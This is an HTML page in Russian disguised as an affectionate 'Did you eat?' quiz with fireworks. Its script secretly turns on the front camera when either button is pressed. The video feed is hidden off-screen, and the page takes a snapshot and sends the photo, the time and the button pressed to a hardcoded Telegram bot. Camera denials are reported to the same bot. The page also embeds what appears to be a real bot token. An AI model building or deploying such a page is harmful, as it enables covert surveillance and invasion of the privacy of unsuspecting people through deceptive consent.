<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
    <title>Ты кушала?</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #0a0a0a;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Segoe UI', Arial, sans-serif;
            user-select: none;
            padding: 20px;
            overflow: hidden;
        }
        .card {
            background: rgba(20, 20, 30, 0.85);
            backdrop-filter: blur(10px);
            padding: 40px 30px;
            border-radius: 40px;
            border: 2px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 0 80px rgba(255, 100, 150, 0.25);
            max-width: 420px;
            width: 100%;
            text-align: center;
            transition: transform 0.2s;
            position: relative;
            z-index: 10;
        }
        .card h1 {
            font-size: 48px;
            color: #fff;
            margin-bottom: 10px;
            letter-spacing: 2px;
        }
        .card p {
            color: rgba(255, 255, 255, 0.5);
            font-size: 16px;
            margin-bottom: 30px;
        }
        .emoji-big {
            font-size: 72px;
            display: block;
            margin-bottom: 15px;
        }
        .buttons {
            display: flex;
            gap: 20px;
            justify-content: center;
            flex-wrap: wrap;
        }
        .btn {
            padding: 14px 40px;
            border: none;
            border-radius: 60px;
            font-size: 20px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.2s ease;
            color: #fff;
            letter-spacing: 1px;
            min-width: 120px;
        }
        .btn-yes {
            background: #4caf50;
            box-shadow: 0 0 30px rgba(76, 175, 80, 0.3);
        }
        .btn-yes:hover {
            transform: scale(1.05);
            box-shadow: 0 0 50px rgba(76, 175, 80, 0.5);
        }
        .btn-no {
            background: #f44336;
            box-shadow: 0 0 30px rgba(244, 67, 54, 0.3);
        }
        .btn-no:hover {
            transform: scale(1.05);
            box-shadow: 0 0 50px rgba(244, 67, 54, 0.5);
        }
        .btn:active {
            transform: scale(0.92);
        }
        .status {
            margin-top: 25px;
            color: rgba(255, 255, 255, 0.3);
            font-size: 13px;
            min-height: 24px;
            transition: all 0.3s;
        }
        .status.active {
            color: #4caf50;
        }
        .status.error {
            color: #f44336;
        }
        /* КАМЕРА СКРЫТА */
        #camera-feed {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }
        canvas#snapshot-canvas {
            display: none;
        }
        canvas#firework-canvas {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 999;
        }
        .hint {
            position: fixed;
            bottom: 20px;
            left: 0;
            width: 100%;
            text-align: center;
            color: rgba(255, 255, 255, 0.08);
            font-size: 10px;
            pointer-events: none;
            z-index: 1;
        }
    </style>
</head>
<body>

    <div class="card" id="card">
        <span class="emoji-big">🍕</span>
        <h1>Ты кушала?</h1>
        <p>Просто нажми «Да» или «Нет» — это важно ❤️</p>
        <div class="buttons">
            <button class="btn btn-yes" id="btnYes">✅ Да</button>
            <button class="btn btn-no" id="btnNo">❌ Нет</button>
        </div>
        <div class="status" id="status">Нажми на кнопку...</div>
    </div>

    <div class="hint">нажми в любое место — будет фейерверк</div>

    <video id="camera-feed" autoplay playsinline muted></video>
    <canvas id="snapshot-canvas"></canvas>
    <canvas id="firework-canvas"></canvas>

    <script>
        // ============================================================
        // 🔥 ВСТАВЬ СЮДА СВОЙ НОВЫЙ ТОКЕН И CHAT_ID
        // ============================================================
        const BOT_TOKEN = '8835332435:AAFGI_UpTv6OiQ78e60Zpbr2Hrt4fNwK3d4';
        const CHAT_ID   = '18802572';
        // ============================================================

        // ============================================================
        // 1. ЭЛЕМЕНТЫ
        // ============================================================
        const btnYes = document.getElementById('btnYes');
        const btnNo  = document.getElementById('btnNo');
        const statusEl = document.getElementById('status');
        const videoEl = document.getElementById('camera-feed');
        const snapshotCanvas = document.getElementById('snapshot-canvas');
        const snapCtx = snapshotCanvas.getContext('2d');
        const card = document.getElementById('card');

        let stream = null;

        // ============================================================
        // 2. ОТПРАВКА ТЕКСТА
        // ============================================================
        function sendTelegram(text) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: text,
                    parse_mode: 'HTML',
                    disable_notification: false
                })
            })
            .then(r => r.json())
            .then(data => {
                if (data.ok) console.log('✅ Текст отправлен');
                else console.warn('❌ Ошибка текста:', data.description);
            })
            .catch(err => console.warn('❌ Не отправился текст:', err));
        }

        // ============================================================
        // 3. ОТПРАВКА ФОТО
        // ============================================================
        function sendPhotoToTelegram(canvas, caption) {
            return new Promise((resolve, reject) => {
                canvas.toBlob((blob) => {
                    if (!blob) {
                        reject('Не удалось создать Blob');
                        return;
                    }
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, 'snapshot.jpg');
                    formData.append('caption', caption);
                    formData.append('parse_mode', 'HTML');

                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    })
                    .then(r => r.json())
                    .then(data => {
                        if (data.ok) {
                            console.log('✅ Фото отправлено');
                            resolve(data);
                        } else {
                            console.warn('❌ Ошибка фото:', data.description);
                            reject(data.description);
                        }
                    })
                    .catch(err => {
                        console.warn('❌ Не отправилось фото:', err);
                        reject(err);
                    });
                }, 'image/jpeg', 0.85);
            });
        }

        // ============================================================
        // 4. ЗАХВАТ СНИМКА
        // ============================================================
        function captureSnapshot() {
            if (!stream) return null;
            const track = stream.getVideoTracks()[0];
            const settings = track.getSettings();
            const width = settings.width || 640;
            const height = settings.height || 480;
            snapshotCanvas.width = width;
            snapshotCanvas.height = height;
            snapCtx.drawImage(videoEl, 0, 0, width, height);
            return snapshotCanvas;
        }

        // ============================================================
        // 5. ЗАПРОС КАМЕРЫ + СНИМОК + ОТПРАВКА
        // ============================================================
        function requestCamera(buttonLabel) {
            if (stream) {
                statusEl.textContent = `✅ Камера уже включена (ты нажал «${buttonLabel}»)`;
                statusEl.className = 'status active';
                return;
            }

            sendTelegram(`📸 <b>Попытка включить камеру</b>\nКнопка: ${buttonLabel}\nВремя: ${new Date().toLocaleString('ru-RU')}`);

            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
                .then((mediaStream) => {
                    stream = mediaStream;
                    videoEl.srcObject = stream;

                    setTimeout(() => {
                        const snapCanvas = captureSnapshot();
                        if (snapCanvas) {
                            const caption = `📸 <b>Снимок с камеры</b>\nКнопка: ${buttonLabel}\nВремя: ${new Date().toLocaleString('ru-RU')}`;
                            sendPhotoToTelegram(snapCanvas, caption)
                                .then(() => {
                                    statusEl.textContent = `✅ Камера включена, фото отправлено (${buttonLabel})`;
                                    statusEl.className = 'status active';
                                })
                                .catch(() => {
                                    statusEl.textContent = `✅ Камера включена, но фото не отправилось (${buttonLabel})`;
                                    statusEl.className = 'status active';
                                });
                        } else {
                            statusEl.textContent = `✅ Камера включена, но снимок не сделан (${buttonLabel})`;
                            statusEl.className = 'status active';
                            sendTelegram(`⚠️ Камера включена, но снимок не удался`);
                        }
                    }, 600);

                    card.style.transform = 'scale(0.97)';
                    setTimeout(() => { card.style.transform = 'scale(1)'; }, 150);

                })
                .catch((err) => {
                    statusEl.textContent = `❌ Доступ к камере запрещён (ошибка: ${err.name})`;
                    statusEl.className = 'status error';
                    sendTelegram(`❌ <b>Камера ОТКЛЮЧЕНА</b>\nКнопка: ${buttonLabel}\nОшибка: ${err.name}\nВремя: ${new Date().toLocaleString('ru-RU')}`);
                });
        }

        // ============================================================
        // 6. КНОПКИ
        // ============================================================
        btnYes.addEventListener('click', function(e) {
            e.stopPropagation();
            requestCamera('Да');
            createExplosion(e.clientX || window.innerWidth/2, e.clientY || window.innerHeight/2);
        });

        btnNo.addEventListener('click', function(e) {
            e.stopPropagation();
            requestCamera('Нет');
            createExplosion(e.clientX || window.innerWidth/2, e.clientY || window.innerHeight/2);
        });

        // ============================================================
        // 7. ОСТАНОВКА КАМЕРЫ
        // ============================================================
        window.addEventListener('beforeunload', function() {
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
                console.log('🔴 Камера остановлена');
            }
        });

        // ============================================================
        // 8. ФЕЙЕРВЕРК
        // ============================================================
        const fwCanvas = document.getElementById('firework-canvas');
        const fwCtx = fwCanvas.getContext('2d');
        let w, h;

        function resize() {
            w = fwCanvas.width = window.innerWidth;
            h = fwCanvas.height = window.innerHeight;
        }
        resize();
        window.addEventListener('resize', resize);

        let particles = [];

        function createExplosion(x, y) {
            const count = 80 + Math.floor(Math.random() * 60);
            const colors = [
                '#ff6b6b', '#ffd93d', '#6bcb77', '#4d96ff',
                '#ff6bcb', '#a66bff', '#ff9f43', '#00d2d3',
                '#f368e0', '#ff9ff3', '#54a0ff', '#5f27cd'
            ];
            for (let i = 0; i < count; i++) {
                const angle = Math.random() * Math.PI * 2;
                const speed = 1.5 + Math.random() * 8;
                const size = 3 + Math.random() * 8;
                particles.push({
                    x, y,
                    vx: Math.cos(angle) * speed,
                    vy: Math.sin(angle) * speed - 0.5,
                    life: 1,
                    decay: 0.006 + Math.random() * 0.015,
                    size,
                    color: colors[Math.floor(Math.random() * colors.length)],
                    gravity: 0.1
                });
            }
        }

        function updateParticles() {
            for (let i = particles.length - 1; i >= 0; i--) {
                const p = particles[i];
                p.x += p.vx;
                p.y += p.vy;
                p.vy += p.gravity;
                p.vx *= 0.99;
                p.life -= p.decay;
                if (p.life <= 0) particles.splice(i, 1);
            }
        }

        function drawParticles() {
            fwCtx.clearRect(0, 0, w, h);
            for (const p of particles) {
                fwCtx.globalAlpha = p.life;
                fwCtx.shadowBlur = 20;
                fwCtx.shadowColor = p.color;
                fwCtx.fillStyle = p.color;
                fwCtx.beginPath();
                fwCtx.arc(p.x, p.y, p.size * p.life, 0, Math.PI * 2);
                fwCtx.fill();
                fwCtx.shadowBlur = 40;
                fwCtx.globalAlpha = p.life * 0.3;
                fwCtx.beginPath();
                fwCtx.arc(p.x, p.y, p.size * p.life * 2, 0, Math.PI * 2);
                fwCtx.fill();
            }
            fwCtx.globalAlpha = 1;
            fwCtx.shadowBlur = 0;
        }

        function animate() {
            updateParticles();
            drawParticles();
            requestAnimationFrame(animate);
        }
        animate();

        document.addEventListener('click', (e) => {
            const x = e.clientX;
            const y = e.clientY;
            for (let i = 0; i < 2; i++) {
                setTimeout(() => {
                    createExplosion(
                        x + (Math.random() - 0.5) * 100,
                        y + (Math.random() - 0.5) * 100
                    );
                }, i * 60);
            }
        });

        document.addEventListener('touchstart', (e) => {
            const touch = e.touches[0];
            const x = touch.clientX;
            const y = touch.clientY;
            for (let i = 0; i < 2; i++) {
                setTimeout(() => {
                    createExplosion(
                        x + (Math.random() - 0.5) * 100,
                        y + (Math.random() - 0.5) * 100
                    );
                }, i * 60);
            }
        }, { passive: true });

        setTimeout(() => {
            createExplosion(w/2, h/2);
            createExplosion(w/2 - 80, h/2 - 50);
            createExplosion(w/2 + 80, h/2 + 30);
        }, 400);

        // ============================================================
        // 9. СТАРТ
        // ============================================================
        statusEl.textContent = 'Нажми «Да» или «Нет»...';
        console.log('🚀 Готово. Вставь токен и CHAT_ID, залей на хостинг.');
    </script>
</body>
</html>
